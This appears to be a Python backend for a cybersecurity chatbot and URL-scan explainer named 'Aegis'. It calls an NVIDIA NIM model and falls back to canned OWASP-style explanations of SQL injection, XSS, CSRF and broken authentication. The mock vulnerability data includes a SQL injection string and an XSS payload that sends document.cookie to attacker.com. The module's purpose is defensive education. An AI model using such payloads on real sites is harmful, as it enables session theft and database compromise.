import os
import httpx
from typing import List, Dict, Optional
from dotenv import load_dotenv

load_dotenv()

# NVIDIA NIM API configuration
NVIDIA_API_KEY = os.getenv("NVIDIA_API_KEY", "")
NVIDIA_NIM_URL = os.getenv("NVIDIA_NIM_URL", "https://integrate.api.nvidia.com/v1/chat/completions")
NVIDIA_NIM_MODEL = os.getenv("NVIDIA_NIM_MODEL", "meta/llama-3.1-8b-instruct")

MOCK_VULNERABILITY_DATA = {
    "sql injection": {
        "what_is_it": "SQL Injection (SQLi) is a vulnerability where an attacker manipulates SQL queries by injecting malicious SQL statements into input fields. This tricks the database interpreter into executing unintended commands.",
        "how_attackers_use": "Attackers enter strings like `' OR '1'='1` or utilize UNION-based attacks inside username/search fields to bypass login panels, read sensitive tables, modify databases, or execute administrative operations.",
        "impact": "CRITICAL. Complete data breach, unauthorized access to user accounts, data deletion/corruption, and in some configurations, remote code execution (RCE) on the database server.",
        "how_to_fix": "1. Use Prepared Statements / Parameterized Queries (e.g., using SQLAlchemy or standard placeholder bindings).\n2. Implement Input Sanitization & Whitelisting.\n3. Minimize database credentials privileges (least privilege access control).\n\n*Secure Code Example (Python SQLAlchemy)*:\n```python\n# SECURE: Using ORM session query parameterizes automatically\nuser = db.query(User).filter(User.username == input_username).first()\n```"
    },
    "xss": {
        "what_is_it": "Cross-Site Scripting (XSS) occurs when a web application processes user-supplied input without sanitizing or encoding it, allowing malicious Javascript payloads to run in target users' browsers.",
        "how_attackers_use": "Attackers inject scripts (e.g. `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`) into comment sections, search boxes, or headers. When other users view the page, their browser executes this script.",
        "impact": "HIGH. Session hijacking (theft of JWT/session cookies), website defacement, redirects to malicious download servers, or keylogging user credentials.",
        "how_to_fix": "1. Context-aware Output Encoding (escape `<`, `>`, `&`, `\"`, `'` symbols before rendering).\n2. Set Strict Content Security Policy (CSP) headers.\n3. Configure session cookies with `HttpOnly` and `Secure` attributes.\n\n*Secure Code Example (React)*:\n```javascript\n// React automatically escapes variables in curly brackets, preventing XSS:\nreturn <div>{userInput}</div>;\n// AVOID using dangerouslySetInnerHTML unless input is pre-sanitized!\n```"
    },
    "csrf": {
        "what_is_it": "Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in.",
        "how_attackers_use": "An attacker creates a malicious page containing a hidden form or request that triggers an action on the target site (like `POST /api/user/change-email`). When the logged-in victim visits the attacker's page, their browser automatically includes their session cookies, completing the transaction.",
        "impact": "MEDIUM-HIGH. Unauthorized state-changing actions, such as changing passwords, updating emails, transfer of funds, or administrative configurations modifications.",
        "how_to_fix": "1. Implement Anti-CSRF Tokens (unique, cryptographically secure values mapped to the session).\n2. Set cookie header attributes to `SameSite=Strict` or `SameSite=Lax`.\n3. Implement custom request headers like `X-Requested-With` or custom tokens for API queries.\n\n*Secure Cookie Config (FastAPI)*:\n```python\nresponse.set_cookie(key=\"session_id\", value=session_id, samesite=\"lax\", secure=True, httponly=True)\n```"
    },
    "broken authentication": {
        "what_is_it": "Broken Authentication refers to weaknesses in login mechanisms, session management, or credential verification systems that allow malicious actors to compromise accounts.",
        "how_attackers_use": "Attackers perform automated credential stuffing attacks, exploit weak session ID generators, hijack active sessions via unencrypted networks, or bypass reset-password links.",
        "impact": "CRITICAL. Widespread account takeovers, administrative panels compromises, identity theft, and corporate databases exposure.",
        "how_to_fix": "1. Enforce strong password complexity rules and Multi-Factor Authentication (MFA).\n2. Implement rate limiting on logins (e.g., maximum 5 attempts per IP per minute).\n3. Rotate session keys upon login and invalidate tokens on logout.\n\n*Secure FastAPI Login Rate Limiting (Pseudocode)*:\n```python\n# Use limiter dependencies to avoid brute-forcing authentication endpoints\n@router.post(\"/login\")\n@limiter.limit(\"5/minute\")\ndef login(request: Request):\n    ...\n```"
    }
}

async def call_nvidia_nim(messages: List[Dict[str, str]], max_tokens: int = 800) -> str:
    """Send requests directly to NVIDIA NIM API endpoint."""
    if not NVIDIA_API_KEY:
        raise ValueError("NVIDIA_API_KEY is not configured")
        
    headers = {
        "Authorization": f"Bearer {NVIDIA_API_KEY}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "model": NVIDIA_NIM_MODEL,
        "messages": messages,
        "max_tokens": max_tokens,
        "temperature": 0.2
    }
    
    try:
        async with httpx.AsyncClient(timeout=30.0) as client:
            response = await client.post(NVIDIA_NIM_URL, headers=headers, json=payload)
            response.raise_for_status()
            result = response.json()
            return result["choices"][0]["message"]["content"]
    except Exception as e:
        print(f"[NVIDIA NIM ERROR] Call to {NVIDIA_NIM_URL} failed with: {e}")
        if 'response' in locals() and hasattr(response, 'text'):
            print(f"[NVIDIA NIM DETAILS] Response body: {response.text}")
        raise e

async def generate_scan_explanation(url: str, risk: str, score: int, issues: List[str]) -> str:
    """Explain scan risks and how to patch issues using NVIDIA NIM or fallback templates."""
    if NVIDIA_API_KEY:
        system_prompt = (
            "You are an expert cybersecurity advisor. Analyze the given web security scan results. "
            "Write a concise, professional assessment. Outline the threats present, severity, "
            "exploitation possibilities, and clear action items to mitigate the issues. Use markdown formatting."
        )
        
        user_message = (
            f"Scan Details:\n"
            f"- Target URL: {url}\n"
            f"- Security Score: {score}/100\n"
            f"- Risk Classification: {risk}\n"
            f"- Detected Issues: {', '.join(issues) if issues else 'No obvious issues found.'}\n\n"
            f"Please explain these findings and suggest quick remediations."
        )
        
        try:
            return await call_nvidia_nim([
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_message}
            ])
        except Exception as e:
            # Fallback to local generator on error
            pass
            
    # Mock / Local fallback response
    issues_str = "\n".join([f"- {issue}" for issue in issues]) if issues else "- No critical vulnerabilities found"
    
    if risk in ("HIGH", "CRITICAL"):
        severity = "HIGH" if risk == "HIGH" else "CRITICAL"
        explanation = (
            f"### Security Threat Analysis for {url}\n\n"
            f"**Risk Level**: `{risk}` | **Overall Score**: `{score}/100`\n\n"
            f"The scanner has flagged security vulnerabilities on this target host. An evaluation "
            f"of the findings suggests that this target poses a `{severity}` threat to users:\n\n"
            f"#### Detected Risks:\n{issues_str}\n\n"
            f"#### Vulnerability Explanations & Attack Vectors:\n"
        )
        
        if "Missing HTTPS (Unencrypted connection)" in issues or "Unencrypted HTTP schema" in issues:
            explanation += (
                "- **Unencrypted Traffic Risk**: Operating over unencrypted HTTP exposes communication to "
                "Man-in-the-Middle (MitM) attacks. Anyone on the same local network can capture cookies, logins, and private session payloads.\n"
            )
        if "IP address used as hostname" in issues:
            explanation += (
                "- **Spoofing / Phishing Check**: Phishing campaigns utilize raw IP addresses to bypass domain "
                "reputation systems. Legitimate companies rarely host public assets directly on raw IPs without DNS records.\n"
            )
        if "Suspicious keyword(s)" in issues:
            explanation += (
                "- **Social Engineering Triggers**: Keywords inside URL names mimic legitimate services "
                "to deceive victims. Attackers rely on names like 'secure-bank-login' to gain trust.\n"
            )
        if "Multiple redirects" in issues:
            explanation += (
                "- **Redirect Gateway Hijacks**: Redirect chains are deployed to route traffic from a seemingly "
                "innocuous URL into credential harvesting landing pages.\n"
            )
            
        explanation += (
            f"\n#### Immediate Recommendations:\n"
            f"1. **Enforce SSL/TLS**: Install a standard SSL certificate and redirect all HTTP traffic to HTTPS via status code 301.\n"
            f"2. **Implement Security Headers**: Configure HTTP headers: `Strict-Transport-Security`, `X-Frame-Options`, and `Content-Security-Policy`.\n"
            f"3. **Examine Redirection**: Audit backend redirection controllers to ensure they only route to whitelisted target hostnames."
        )
    else:
        explanation = (
            f"### Security Scan Summary for {url}\n\n"
            f"**Risk Level**: `LOW` | **Overall Score**: `{score}/100`\n\n"
            f"The analyzed URL is structured securely. No immediate critical vulnerability indicators "
            f"were identified on this domain.\n\n"
            f"**Security Checks Passed Successfully**:\n"
            f"- Valid SSL/TLS certificate configured\n"
            f"- Canonical URL redirects resolved correctly\n"
            f"- Clean naming pattern (no domain mimicry keywords observed)\n\n"
            f"**Suggested Maintenance**:\n"
            f"Continue running routine vulnerability assessments and ensure server-side dependencies are updated regularly."
        )
    return explanation

async def generate_vulnerability_explanation(vuln_name: str) -> Dict[str, str]:
    """Provide detailed OWASP style security descriptions."""
    key = vuln_name.lower().strip()
    
    if NVIDIA_API_KEY:
        system_prompt = (
            "You are an expert OWASP penetration tester. Explain the specified vulnerability. "
            "You MUST output raw text that fits precisely into these fields: what_is_it, how_attackers_use, "
            "impact, how_to_fix. Ensure highly detailed, technical, clean markdown responses."
        )
        
        # We prompt the model to return a structured JSON to easily parse
        user_message = (
            f"Explain vulnerability: {vuln_name}. Return format MUST be JSON with fields: "
            f"'what_is_it', 'how_attackers_use', 'impact', 'how_to_fix'. Do not include markdown code block syntax around the JSON."
        )
        
        try:
            import json
            raw_response = await call_nvidia_nim([
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_message}
            ])
            # Parse response
            # Strip code blocks if LLM still wraps it
            cleaned = raw_response.strip()
            if cleaned.startswith("```json"):
                cleaned = cleaned[7:-3]
            elif cleaned.startswith("```"):
                cleaned = cleaned[3:-3]
            data = json.loads(cleaned)
            return {
                "name": vuln_name,
                "what_is_it": data.get("what_is_it", ""),
                "how_attackers_use": data.get("how_attackers_use", ""),
                "impact": data.get("impact", ""),
                "how_to_fix": data.get("how_to_fix", "")
            }
        except Exception:
            # Fall back to template mock data
            pass
            
    # Mock Fallback
    if key in MOCK_VULNERABILITY_DATA:
        vuln_info = MOCK_VULNERABILITY_DATA[key]
        return {
            "name": vuln_name,
            **vuln_info
        }
        
    # Default template fallback for custom vulnerability names
    return {
        "name": vuln_name,
        "what_is_it": f"{vuln_name} is a class of cybersecurity vulnerability that arises from weak configuration or missing input validations.",
        "how_attackers_use": f"Attackers exploit {vuln_name} by probing application interfaces, submitting unexpected payloads, or hijacking parameters to execute unauthorized commands or bypass security filters.",
        "impact": "HIGH. Varies by environment. Potential for unauthorized user access, data leaks, or complete system compromise.",
        "how_to_fix": f"1. Audit all parameters processing client inputs.\n2. Ensure security headers and encryption settings are active.\n3. Validate application roles using least privilege principles."
    }

async def generate_chatbot_response(message: str, history: List[Dict[str, str]] = None) -> str:
    """Analyze chat question and generate response."""
    if NVIDIA_API_KEY:
        system_prompt = (
            "You are 'Aegis', a highly advanced AI cybersecurity assistant. "
            "You are extremely accurate, logical, and technical, specializing in cybersecurity audits, "
            "vulnerability remediations, and secure software development. You are also a highly capable general-purpose assistant "
            "like ChatGPT.\n\n"
            "CRITICAL: Before answering the user's query, you MUST perform a deep thinking step. "
            "Write down your reasoning, analysis, and data extraction inside a `<thought>` tag at the absolute beginning of your response. "
            "In your thinking block, analyze the user's intent, list relevant cybersecurity metrics or general knowledge facts, "
            "and plan your detailed explanation. After closing the `</thought>` tag, write your comprehensive, detailed, "
            "and highly accurate response using clean markdown formatting."
        )
        
        messages = [{"role": "system", "content": system_prompt}]
        
        # Format history for LLM
        if history:
            for msg in history:
                role = "user" if msg["sender"] == "user" else "assistant"
                messages.append({"role": role, "content": msg["text"]})
                
        messages.append({"role": "user", "content": message})
        
        try:
            return await call_nvidia_nim(messages)
        except Exception as e:
            # Fallback on failure
            pass
            
    # Mock / Local Chatbot Response logic matching user queries
    msg_lower = message.lower()
    
    if "url safe" in msg_lower or "check url" in msg_lower or "is this url" in msg_lower:
        return (
            "<thought>\n"
            "User is asking how to verify URL safety.\n"
            "Extracting key threat telemetry parameters: HTTPS status, domain authenticity, registration age.\n"
            "Formulating security recommendations and mapping vulnerabilities (phishing, social engineering).\n"
            "</thought>\n"
            "### URL Security Assessment Guide\n\n"
            "To evaluate if a URL is safe, you should look for the following criteria:\n"
            "1. **Encryption (HTTPS)**: Does the website use HTTPS with a valid certificate? Run it through our URL security scanner.\n"
            "2. **Domain Authenticity**: Look closely at the domain name. Phishers use typosquatting (e.g. `g00gle.com` or `secure-paypal-login.net`).\n"
            "3. **Domain Reputation**: Check if the domain was registered recently (within the last 30 days) using WHOIS lookup tools.\n\n"
            "**Threat explanation**: Attackers create mock landing pages to hijack login tokens and passwords.\n"
            "**Severity**: `HIGH`\n"
            "**Possible attacks**: Credentials harvesting, drive-by downloads, sessions hijacking.\n"
            "**Fix recommendations**: Use active domain blocklists, enforce MFA on all profiles, and install browser security extensions."
        )
    elif "secure my website" in msg_lower or "harden server" in msg_lower or "secure server" in msg_lower:
        return (
            "<thought>\n"
            "User is requesting web application and server hardening guidelines.\n"
            "Extracting key defense-in-depth categories: Session Security, HTTP Headers, Input Validation, and Dependency Checking.\n"
            "Formulating recommendations for Nginx/FastAPI environments.\n"
            "</thought>\n"
            "### How to Secure Your Web Application\n\n"
            "Hardening your web server and application requires a defense-in-depth approach:\n\n"
            "1. **Secure Session Cookies**: Configure cookies with `HttpOnly`, `Secure`, and `SameSite=Strict` flags.\n"
            "2. **Implement Security Headers**: Enforce headers like CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.\n"
            "3. **Zero Trust Database Access**: Use parameterized database statements and validate all incoming inputs.\n"
            "4. **Dependency Management**: Continuously scan package files (like package.json, requirements.txt) for known CVEs.\n\n"
            "**Severity**: `CRITICAL` (if unprotected)\n"
            "**Possible attacks**: SQL Injection, Cross-Site Scripting, Clickjacking, Remote Code Execution.\n"
            "**Fix recommendations**: Enable automatic security updates, restrict firewall ports to 80/443 only, and run weekly security scanning assessments."
        )
    elif "sql injection" in msg_lower or "sqli" in msg_lower:
        info = MOCK_VULNERABILITY_DATA["sql injection"]
        return (
            f"<thought>\n"
            f"User is asking about SQL Injection (SQLi).\n"
            f"Retrieving definitions, common attack vectors (' OR '1'='1), severity ratings, and parameterized query fixes.\n"
            f"</thought>\n"
            f"### SQL Injection (SQLi) Vulnerability Report\n\n"
            f"**Severity**: `{info['impact']}`\n\n"
            f"**Threat Explanation**:\n{info['what_is_it']}\n\n"
            f"**Exploitation Methodology**:\n{info['how_attackers_use']}\n\n"
            f"**Remediation Steps**:\n{info['how_to_fix']}"
        )
    elif "xss" in msg_lower or "cross-site scripting" in msg_lower:
        info = MOCK_VULNERABILITY_DATA["xss"]
        return (
            f"<thought>\n"
            f"User is asking about Cross-Site Scripting (XSS).\n"
            f"Retrieving definition, client-side script execution mechanics, session hijacking impacts, and content security policy (CSP) mitigations.\n"
            f"</thought>\n"
            f"### Cross-Site Scripting (XSS) Vulnerability Report\n\n"
            f"**Severity**: `{info['impact']}`\n\n"
            f"**Threat Explanation**:\n{info['what_is_it']}\n\n"
            f"**Exploitation Methodology**:\n{info['how_attackers_use']}\n\n"
            f"**Remediation Steps**:\n{info['how_to_fix']}"
        )
    else:
        return (
            f"<thought>\n"
            f"User query: '{message}'\n"
            f"Analyzing query type. Providing general security recommendations, "
            f"remediation actions, and firewall diagnostic instructions.\n"
            f"</thought>\n"
            f"### Aegis - Cybersecurity Assistant Response\n\n"
            f"Thank you for reaching out. Regarding your question: *\"{message}\"*\n\n"
            f"To assist you: inside cybersecurity design, we always verify that client inputs are fully "
            f"parameterized, session cookies are configured with secure tags, and transport encryption (HTTPS) "
            f"is mandatory.\n\n"
            f"**Remediation Action Item**: If you are debugging a security issue, check the logs of your firewall/API gateway, "
            f"run an automated security scanner on the target port, and audit active authorization headers."
        )
